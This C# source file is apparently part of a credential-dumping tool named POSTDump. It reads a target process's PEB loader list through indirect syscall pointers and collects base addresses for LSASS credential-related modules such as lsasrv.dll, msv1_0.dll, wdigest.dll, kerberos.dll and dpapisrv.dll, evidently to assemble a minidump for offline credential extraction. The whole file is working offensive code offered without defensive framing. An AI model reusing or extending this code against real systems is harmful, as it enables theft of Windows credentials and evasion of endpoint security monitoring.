using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace POSTMiniDump
{
    public class Modules
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate Data.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, Data.PROCESSINFOCLASS pic, out Data.PROCESS_BASIC_INFORMATION pbi, int cb, out int pSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, out Data.LDR_DATA_TABLE_ENTRY buffer, uint bytesToRead, ref uint bytesRead);

        internal static List<Data.PModuleInfo> find_modules(IntPtr Hprocess)
        {
            List<Data.PModuleInfo> moduleslist = new List<Data.PModuleInfo>();
            IntPtr ldr_entry_address = get_module_list_address(Hprocess);
            if (ldr_entry_address == IntPtr.Zero)
            {
                return null;
            }

            int dlls_found = 0;
            Data.UNICODE_STRING base_dll_name;
            string[] important_modules = { "lsasrv.dll", "msv1_0.dll", "tspkg.dll", "wdigest.dll", "kerberos.dll", "livessp.dll", "dpapisrv.dll", "kdcsvc.dll", "cryptdll.dll", "lsadb.dll", "samsrv.dll", "rsaenh.dll", "ncrypt.dll", "ncryptprov.dll", "eventlog.dll", "wevtsvc.dll", "termsrv.dll", "cloudap.dll" };

            Data.LDR_DATA_TABLE_ENTRY ldr_entry = new Data.LDR_DATA_TABLE_ENTRY();
            IntPtr first_ldr_entry_address = IntPtr.Zero;
            while (dlls_found < important_modules.Length)
            {
                bool success = read_ldr_entry(Hprocess, ldr_entry_address, out ldr_entry, out base_dll_name);
                if (!success)
                {
                    //MessageBox.Show("Could not read ldr entry");
                    return null;
                }


                for (int i = 0; i < important_modules.Length; i++)
                {
                    if (important_modules[i].Equals(base_dll_name.ToString(), StringComparison.OrdinalIgnoreCase))
                    {
                            
                        //MessageBox.Show($"Found {important_modules[i]} at "+ ldr_entry_address.ToString("x"));
                        Data.PModuleInfo new_module = add_new_module(Hprocess, ldr_entry);
                        moduleslist.Add(new_module);
                        dlls_found++;
                        break;
                    }
                }

                ldr_entry_address = (IntPtr)ldr_entry.InMemoryOrderLinks.Flink;
                if (ldr_entry_address == first_ldr_entry_address)
                {
                    break;
                }

                if (first_ldr_entry_address == IntPtr.Zero)
                {
                    first_ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
                }
            }
            
            return moduleslist;
        }
        
        private static bool read_ldr_entry(IntPtr Hprocess, IntPtr ldr_entry_address, out Data.LDR_DATA_TABLE_ENTRY ldr_entry, out Data.UNICODE_STRING base_dll_name)
        {
            
            uint r = 0;
            NtReadVirtualMemory NTRVM2 = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntreadptr, typeof(NtReadVirtualMemory));
            Data.NTSTATUS status = NTRVM2(Hprocess, ldr_entry_address, out ldr_entry, (uint)Marshal.SizeOf(typeof(Data.LDR_DATA_TABLE_ENTRY)), ref r);

            if (status != Data.NTSTATUS.Success)
            {
                //MessageBox.Show("Could not read module information at: 0x{0:x}", ldr_entry_address.ToString("X"));
                base_dll_name = new Data.UNICODE_STRING();
                return false;
            }

            base_dll_name = new Data.UNICODE_STRING();
            base_dll_name.Buffer = Utils.intAlloc(Data.MAX_PATH);
            MiniDump.NtReadVirtualMemory NTRVM = (MiniDump.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntreadptr, typeof(MiniDump.NtReadVirtualMemory));
            Data.NTSTATUS status2 = NTRVM(Hprocess, ldr_entry.BaseDllName.Buffer, base_dll_name.Buffer, (uint)ldr_entry.BaseDllName.Length, ref r);
            if (status2 != Data.NTSTATUS.Success)
            {
                //MessageBox.Show("Could not read module information at: 0x{0:x}", ldr_entry_address.ToString("X"));
                return false;
            }
 
            return true;
        }

        private static IntPtr get_module_list_address(IntPtr Hprocess)
        {
            IntPtr peb_address, ldr_pointer, module_list_pointer = IntPtr.Zero;

            peb_address = get_peb_address(Hprocess);
            if (peb_address == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            ldr_pointer = Utils.RVA(peb_address, Data.LDR_POINTER_OFFSET);
            uint byteread = 0;
            IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            MiniDump.NtReadVirtualMemory NTRVM = (MiniDump.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntreadptr, typeof(MiniDump.NtReadVirtualMemory));
            Data.NTSTATUS status = NTRVM(Hprocess, ldr_pointer, buf, (uint)Marshal.SizeOf(typeof(IntPtr)), ref byteread);
            IntPtr ldr_address = Marshal.ReadIntPtr(buf);
            Marshal.FreeHGlobal(buf);

            if (status != Data.NTSTATUS.Success)
            {
                //MessageBox.Show("Could not get LDR address");
                return IntPtr.Zero;
            }


            
            module_list_pointer = Utils.RVA(ldr_address, Data.MODULE_LIST_POINTER_OFFSET);
            IntPtr buf2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            status = NTRVM(Hprocess, module_list_pointer, buf2, (uint)Marshal.SizeOf(typeof(IntPtr)), ref byteread);
            IntPtr ldr_entry_address = Marshal.ReadIntPtr(buf2);
            Marshal.FreeHGlobal(buf2);

            if (status != Data.NTSTATUS.Success)
            {
                //MessageBox.Show(status.ToString());
                return IntPtr.Zero;
            }

            return ldr_entry_address;      
        }

        private static IntPtr get_peb_address(IntPtr Hprocess)
        {
            Data.PROCESSINFOCLASS pic = new Data.PROCESSINFOCLASS();
            Data.PROCESS_BASIC_INFORMATION pbi = new Data.PROCESS_BASIC_INFORMATION();
            pbi.PebBaseAddress = IntPtr.Zero;
            int psize = 0;
            IntPtr ntqueryproc = POSTDump.Postdump.isyscall.GetSyscallPtr("NtQueryInformationProcess");
            NtQueryInformationProcess NTQIP = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(ntqueryproc, typeof(NtQueryInformationProcess));
            Data.NTSTATUS status = NTQIP(Hprocess, pic, out pbi, Marshal.SizeOf(pbi), out psize);

            if (pbi.PebBaseAddress == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            return pbi.PebBaseAddress;
        }

        private static Data.PModuleInfo add_new_module(IntPtr Hprocess, Data.LDR_DATA_TABLE_ENTRY ldr_entry)
        {
            int name_size = 0;
            uint l = 0;
            Data.PModuleInfo new_module = new Data.PModuleInfo();;
            new_module.moduleinfo.lpBaseOfDll = (IntPtr)ldr_entry.DllBase;
            new_module.moduleinfo.SizeOfImage = (uint)ldr_entry.SizeOfImage;
            new_module.TimeDateStamp = ldr_entry.TimeDateStamp;
            new_module.CheckSum = (uint)ldr_entry.CheckSum;
            name_size = ldr_entry.FullDllName.Length;

            new_module.dll_name.Buffer = Utils.intAlloc(ldr_entry.FullDllName.Length);
            MiniDump.NtReadVirtualMemory NTRVM = (MiniDump.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntreadptr, typeof(MiniDump.NtReadVirtualMemory));
            Data.NTSTATUS status = NTRVM(Hprocess, ldr_entry.FullDllName.Buffer, new_module.dll_name.Buffer, (uint)name_size, ref l);
            if (status != Data.NTSTATUS.Success)
            {
                //MessageBox.Show("Failed to read dllname buffer with error "+ status.ToString() );
                return null;
            }
            
            return new_module;
        }
    }
}
